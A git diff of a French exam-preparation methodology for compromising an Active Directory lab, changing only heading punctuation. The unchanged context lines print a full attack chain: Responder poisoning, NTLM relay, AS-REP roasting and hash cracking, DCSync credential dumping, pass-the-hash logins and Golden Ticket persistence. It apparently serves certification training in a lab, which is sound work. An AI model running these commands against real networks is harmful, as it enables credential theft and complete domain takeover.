@@ -1,4 +1,4 @@
-# Méthodologie Exam — Déroulé complet
+# Méthodologie Exam : Déroulé complet
 
 > **Tu viens de recevoir ton accès SSH. Voici exactement ce que tu fais, dans l'ordre.**
 
@@ -18,9 +18,9 @@ Phase 6  → Compromission totale (5 min)
 
 ---
 
-## PHASE 0 — Prise en main de la Kali (5 min)
+## PHASE 0 : Prise en main de la Kali (5 min)
 
-### 0.1 — Se connecter et créer le dossier de travail
+### 0.1 : Se connecter et créer le dossier de travail
 
 ```bash
 # Se connecter via SSH
@@ -61,7 +61,7 @@ FLAG2=
 EOF
 ```
 
-### 0.2 — Identifier le réseau
+### 0.2 : Identifier le réseau
 
 ```bash
 ip a                     # Voir ses interfaces et IPs
@@ -73,7 +73,7 @@ ip route                 # Voir les routes (identifier le réseau cible)
 - Interface réseau : `IFACE` (eth0, eth1, ens33...)
 - Réseau cible : `RANGE` (192.168.X.0/24)
 
-### 0.3 — Définir les variables
+### 0.3 : Définir les variables
 
 ```bash
 # REMPLIR avec les vraies valeurs avant de continuer
@@ -91,9 +91,9 @@ export NT_HASH=""
 
 ---
 
-## PHASE 1 — Reconnaissance (10 min)
+## PHASE 1 : Reconnaissance (10 min)
 
-### 1.1 — Découverte des hôtes
+### 1.1 : Découverte des hôtes
 
 ```bash
 # Scan rapide
@@ -106,7 +106,7 @@ nmap -p 88 --open $RANGE
 
 **Résultat attendu :** L'IP du DC (celui avec le port 88 ouvert)
 
-### 1.2 — Scanner le DC en profondeur
+### 1.2 : Scanner le DC en profondeur
 
 ```bash
 export DC_IP="REMPLACER_PAR_IP_DC"
@@ -119,7 +119,7 @@ nmap -Pn -sC -sV \
 nmap -Pn --script smb-vuln* -p 139,445 $RANGE | tee ~/certif/scans/vulns.txt &
 ```
 
-### 1.3 — Identifier le nom de domaine
+### 1.3 : Identifier le nom de domaine
 
 ```bash
 nslookup $DC_IP               # reverse lookup → donne le FQDN
@@ -140,21 +140,21 @@ echo "$DC_IP  $DC_FQDN  $DOMAIN_FQDN" | sudo tee -a /etc/hosts
 echo "nameserver $DC_IP" | sudo tee /etc/resolv.conf
 ```
 
-### 1.4 — Responder en écoute passive
+### 1.4 : Responder en écoute passive
 
 ```bash
-sudo responder -I $IFACE -A    # mode analyse — juste observer
+sudo responder -I $IFACE -A    # mode analyse : juste observer
 ```
 
 **Si des requêtes LLMNR/NBT-NS apparaissent :** vecteur Responder actif disponible.
 
 ---
 
-## PHASE 2 — Vecteurs d'attaque en parallèle (20 min)
+## PHASE 2 : Vecteurs d'attaque en parallèle (20 min)
 
 > Ouvrir **4 terminaux**. Lancer ces attaques simultanément.
 
-### Terminal 1 — Responder actif
+### Terminal 1 : Responder actif
 
 ```bash
 # Vérifier qu'on a vu du trafic LLMNR/NBT-NS en phase 1
@@ -165,7 +165,7 @@ hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
     /usr/share/wordlists/rockyou.txt &
 ```
 
-### Terminal 2 — Relay NTLM
+### Terminal 2 : Relay NTLM
 
 ```bash
 # Trouver les machines sans signature SMB
@@ -177,7 +177,7 @@ cat ~/certif/targets_relay.txt  # y a-t-il des cibles ?
 ntlmrelayx.py -tf ~/certif/targets_relay.txt -smb2support -socks
 ```
 
-### Terminal 3 — Énumération sans auth + AS-REP
+### Terminal 3 : Énumération sans auth + AS-REP
 
 ```bash
 # Obtenir une liste d'utilisateurs
@@ -199,7 +199,7 @@ GetNPUsers.py $DOMAIN_FQDN/ -no-pass \
     hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
-### Terminal 4 — MITMv6
+### Terminal 4 : MITMv6
 
 ```bash
 # IPv6 actif sur le réseau ? (souvent oui)
@@ -229,9 +229,9 @@ echo "PWD=$PWD" >> ~/certif/notes.txt
 
 ---
 
-## PHASE 3 — Énumération avec le compte obtenu (15 min)
+## PHASE 3 : Énumération avec le compte obtenu (15 min)
 
-### 3.1 — BloodHound en premier
+### 3.1 : BloodHound en premier
 
 ```bash
 # Lancer la collecte (en arrière-plan pendant qu'on fait le reste)
@@ -245,7 +245,7 @@ sudo neo4j start
 bloodhound &
 ```
 
-### 3.2 — Cartographie réseau avec nxc
+### 3.2 : Cartographie réseau avec nxc
 
 ```bash
 # Résumé des accès sur tout le réseau
@@ -259,7 +259,7 @@ nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --users | tee ~/certif/loot/users.txt
 nxc smb $DC_IP -u $USER -p $PWD -d $DOMAIN --groups | tee ~/certif/loot/groups.txt
 ```
 
-### 3.3 — Dump LDAP
+### 3.3 : Dump LDAP
 
 ```bash
 ldapdomaindump -u "$DOMAIN\\$USER" -p $PWD $DC_IP -o ~/certif/loot/ldap/
@@ -270,9 +270,9 @@ grep -i "pass\|pwd\|cred\|secret\|flag" ~/certif/loot/ldap/domain_users.json
 
 ---
 
-## PHASE 4 — Chasse aux flags (10 min)
+## PHASE 4 : Chasse aux flags (10 min)
 
-### 4.1 — SYSVOL et NETLOGON
+### 4.1 : SYSVOL et NETLOGON
 
 ```bash
 # Explorer SYSVOL
@@ -291,7 +291,7 @@ find ~/certif/loot/ -name "Groups.xml" 2>/dev/null | xargs grep -l "cpassword" 2
 gpp-decrypt 'CPASSWORD_VALUE'
 ```
 
-### 4.2 — Partages custom
+### 4.2 : Partages custom
 
 ```bash
 # Voir les partages inhabituels (pas admin$, c$, sysvol, netlogon)
@@ -304,7 +304,7 @@ smbclient //$SERVER/$SHARE -U $DOMAIN/$USER%$PWD
 nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN -M spider_plus
 ```
 
-### 4.3 — Fichiers à cibler
+### 4.3 : Fichiers à cibler
 
 ```bash
 # Types de fichiers intéressants
@@ -315,7 +315,7 @@ find ~/certif/loot/ -name "*.txt" -o -name "*.xml" -o -name "*.ps1" \
 grep -r "FLAG\|flag\|CTF\|certif" ~/certif/loot/ 2>/dev/null | head -20
 ```
 
-### 4.4 — Épreuve à tiroir
+### 4.4 : Épreuve à tiroir
 
 > Chaque flag peut contenir des credentials ou des indices pour la suite.
 
@@ -331,9 +331,9 @@ export PWD="$NEW_PWD"
 
 ---
 
-## PHASE 5 — Escalade de privilèges (variable)
+## PHASE 5 : Escalade de privilèges (variable)
 
-### 5.1 — Lire BloodHound AVANT de choisir une technique
+### 5.1 : Lire BloodHound AVANT de choisir une technique
 
 ```bash
 # Importer le zip dans BloodHound si pas encore fait
@@ -341,7 +341,7 @@ export PWD="$NEW_PWD"
 # Marquer son compte comme "Owned"
 ```
 
-### 5.2 — Selon le chemin BloodHound
+### 5.2 : Selon le chemin BloodHound
 
 **Chemin ACL :**
 
@@ -372,7 +372,7 @@ nxc ldap $DC_IP -u $USER -p $PWD -d $DOMAIN \
 hashcat -m 18200 ~/certif/hashes/asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
-### 5.3 — Tester chaque nouveau compte obtenu
+### 5.3 : Tester chaque nouveau compte obtenu
 
 ```bash
 # Nouveau compte après escalade → tester partout
@@ -385,9 +385,9 @@ nxc smb $DC_IP -u $PRIV_USER -p $PRIV_PWD -d $DOMAIN
 
 ---
 
-## PHASE 6 — Compromission totale (5 min)
+## PHASE 6 : Compromission totale (5 min)
 
-### 6.1 — DCSync
+### 6.1 : DCSync
 
 ```bash
 secretsdump.py $DOMAIN/$PRIV_USER:'$PRIV_PWD'@$DC_IP \
@@ -403,7 +403,7 @@ echo "KRBTGT_HASH: $KRBTGT_HASH"
 echo "DOMAIN_SID: $DOMAIN_SID"
 ```
 
-### 6.2 — Connexion Administrator
+### 6.2 : Connexion Administrator
 
 ```bash
 psexec.py -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP
@@ -411,7 +411,7 @@ psexec.py -hashes :$ADMIN_HASH $DOMAIN/Administrator@$DC_IP
 evil-winrm -i $DC_IP -u Administrator -H $ADMIN_HASH
 ```
 
-### 6.3 — Golden Ticket (persistance)
+### 6.3 : Golden Ticket (persistance)
 
 ```bash
 ticketer.py -nthash $KRBTGT_HASH \
@@ -423,7 +423,7 @@ export KRB5CCNAME=$PWD/Administrator.ccache
 psexec.py -k -no-pass $DOMAIN/Administrator@$DC_FQDN
 ```
 
-### 6.4 — Chercher les flags restants avec Administrator
+### 6.4 : Chercher les flags restants avec Administrator
 
 ```bash
 # Spider complet en tant qu'Administrator
